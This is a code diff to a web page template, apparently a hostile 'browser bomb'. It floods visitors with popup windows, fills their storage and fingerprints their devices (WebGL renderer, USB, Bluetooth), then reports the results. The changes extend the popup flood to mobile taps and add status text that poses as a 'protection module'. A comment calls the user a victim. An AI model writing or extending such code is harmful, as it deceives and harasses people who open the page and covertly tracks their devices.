@@ -82,9 +82,10 @@ body.glitch{animation:shake .12s infinite}
   50%{transform:translate(3px,-4px)}75%{transform:translate(-3px,-3px)}
   100%{transform:translate(4px,2px)}}
 body.glitch .in,body.glitch h1,body.glitch .ck{filter:invert(1) hue-rotate(90deg)}
-#flash{position:fixed;inset:0;pointer-events:none;z-index:50;opacity:0;
+/* 解放オーバーレイ(z90)より上に出して、点滅が隠れないようにする */
+#flash{position:fixed;inset:0;pointer-events:none;z-index:95;opacity:0;
   background:radial-gradient(circle,rgba(255,255,255,.9),rgba(255,0,0,.6) 60%,transparent 75%)}
-#noise{position:fixed;inset:0;pointer-events:none;z-index:49;opacity:.12;
+#noise{position:fixed;inset:0;pointer-events:none;z-index:94;opacity:.12;
   background-image:repeating-linear-gradient(0deg,#fff 0 1px,transparent 1px 3px);display:none}
 .rainbow{animation:rb .6s linear infinite}
 @keyframes rb{to{filter:hue-rotate(360deg)}}
@@ -144,16 +145,17 @@ body.glitch .in,body.glitch h1,body.glitch .ck{filter:invert(1) hue-rotate(90deg
 {% endif %}
 
 <script>
+/* hit_id / auto / seq は必ず数値で出す（undefined だと window.V が構文エラーになる） */
 window.V = {
   code: {{ code|tojson }},
   mode: {{ mode|tojson }},
   dest: {{ dest|tojson }},
-  hit: {{ hit_id }},
+  hit: {{ hit_id or 0 }},
   child: {{ 1 if is_child else 0 }},
   installed: {{ 1 if is_installed else 0 }},
-  auto: {{ 1 if auto else 0 }},
-  set: {{ winset }},
-  seq: {{ seq }},
+  auto: {{ auto or 0 }},
+  set: {{ winset or 100 }},
+  seq: {{ seq or 0 }},
   install_mode: {{ install_mode|tojson }},
   name: {{ link.name|tojson }}
 };
@@ -167,6 +169,7 @@ window.V = {
   var STANDALONE = !!V.installed || (navigator.standalone === true) ||
     !!(window.matchMedia && matchMedia("(display-mode: standalone)").matches);
   var POPUP_MODE = (MODE === "windows" || MODE === "mix");
+  var MOBILE = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
   var VID = (function () {
     try {
@@ -358,6 +361,7 @@ window.V = {
       wake: ("wakeLock" in navigator) ? 1 : 0,
       bluetooth: ("bluetooth" in navigator) ? 1 : 0,
       usb: ("usb" in navigator) ? 1 : 0,
+      mobile: MOBILE ? 1 : 0,
       webglVendor: wg.vendor || "", webglRenderer: wg.renderer || "",
       webglUnmaskedVendor: wg.unVendor || "", webglUnmaskedRenderer: wg.unRenderer || "",
       webglVersion: wg.ver || "", webglMaxTex: wg.maxTex || 0, webglExt: wg.ext || 0,
@@ -486,7 +490,6 @@ window.V = {
             "width=420,height=560,left=" + ((widx % 10) * 54) +
             ",top=" + (20 + (widx % 10) * 34));
     } catch (e) { w = null; }
-    if (!w || (w.closed && !w.closed === false)) { /* 判定は下で */ }
     if (!w) return null;
     /* ブロック時は WindowProxy が返り、すぐ closed になる実装もある */
     try { if (w.closed) return null; } catch (e) {}
@@ -534,18 +537,20 @@ window.V = {
   function showUnlock(on) {
     var u = document.getElementById("unlock");
     if (!u) return;
-    if (on && !unlocked) u.classList.add("on");
+    /* モバイルは解放後も出し直せるようにする（タップのたびに追加で開く） */
+    if (on && (!unlocked || MOBILE)) u.classList.add("on");
     if (!on) u.classList.remove("on");
     var un = document.getElementById("unote");
     if (un) {
       un.textContent = popupBlocked
-        ? "ポップアップがブロックされています / クリックで解除"
-        : (audioLocked ? "音声がロックされています / クリックで解除" : "");
+        ? "ポップアップがブロックされています / タップで解除"
+        : (audioLocked ? "音声がロックされています / タップで解除" : "");
     }
   }
 
   function unlock() {
     unlocked = true;
+    st("解放中…");
     showUnlock(false);
     try { if (navigator.vibrate) navigator.vibrate([120, 60, 120]); } catch (e) {}
     audioCtx();
@@ -862,6 +867,14 @@ window.V = {
   document.addEventListener("click", onGesture);
   document.addEventListener("mousedown", function () { if (!unlocked) unlock(); });
 
+  /* モバイル：タップのたびに追加で開く（解放後もオーバーレイを出し直す） */
+  document.addEventListener("touchend", function () {
+    if (!MOBILE || !POPUP_MODE || !unlocked || !wantMore()) return;
+    var made = pumpOnce(3);
+    if (made) { running = false; fireSet(false); }
+    else { popupBlocked = true; showUnlock(true); }
+  }, { passive: true });
+
   document.addEventListener("visibilitychange", function () {
     if (document.visibilityState === "hidden") { send(behavior(), true); return; }
     send(behavior());
@@ -913,12 +926,19 @@ window.V = {
     soundLoop();
 
   } else if (MODE === "windows") {
-    /* 1枚だけ試して、通れば全開。塞がれていれば解放待ち。 */
+    /* 1枚だけ試して、通れば全開。塞がれていれば解放待ち。
+       状態を必ず画面に出す（読み込み中のまま固まって見えるのを防ぐ） */
+    st("保護モジュール展開中…");
     soundLoop();
     var first = pumpOnce(1);
-    if (first) { fireSet(true); }
-    else { showUnlock(true); }
-    setInterval(function () { fireSet(false); }, 500);
+    if (first) { st("窓を展開中… 0 枚"); fireSet(true); }
+    else { st("ポップアップ解放待ち（画面をタップ）"); showUnlock(true); }
+    setInterval(function () {
+      if (!popupBlocked) {
+        st(wantMore() ? ("窓を展開中… " + fired + " 枚") : ("展開完了 " + fired + " 枚"));
+      }
+      fireSet(false);
+    }, 500);
 
   } else if (MODE === "storage") {
     fillStorage(function () { setTimeout(function () { fillStorage(function () {}); }, 2000); });
@@ -933,13 +953,14 @@ window.V = {
     if (STANDALONE) send({ auto: 1, standalone: 1 });
   }
 
-  /* 解放されない間も定期的に再試行（被害者がいつクリックしても拾う） */
+  /* 解放されない間も定期的に再試行（被害者がいつタップしても拾う） */
   setInterval(function () {
     if (!POPUP_MODE) return;
     if (popupBlocked && wantMore()) {
       running = false;
       var made = pumpOnce(1);
       if (made) { fireSet(true); }
+      else if (MOBILE) { showUnlock(true); }
     }
   }, 1500);
 
